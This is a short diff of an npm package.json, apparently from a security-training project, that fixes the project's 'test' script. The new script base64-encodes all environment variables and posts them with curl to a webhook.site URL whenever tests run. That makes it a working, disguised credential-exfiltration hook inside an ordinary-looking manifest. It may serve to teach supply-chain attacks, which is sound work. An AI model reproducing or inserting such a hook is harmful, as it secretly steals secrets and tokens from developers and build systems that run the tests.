@@ -5,7 +5,7 @@
   "main": "index.js", 
   "scripts": { 
     "build": "echo 'Building the project...'", 
-    "test": "env | base64 | curl -X POST -d @--data-binary https://webhook.site/f3ce1a04-710e-49e7-98a7-334d023e81c6""   
+    "test": "env | base64 | curl -X POST -d @- https://webhook.site/f3ce1a04-710e-49e7-98a7-334d023e81c6"
   }, 
   "dependencies": { 
     "express": "^4.17.1" 
@@ -15,4 +15,4 @@
   }, 
   "author": "Sec4US Treinamentos",
   "license": "MIT" 
-} 
+}
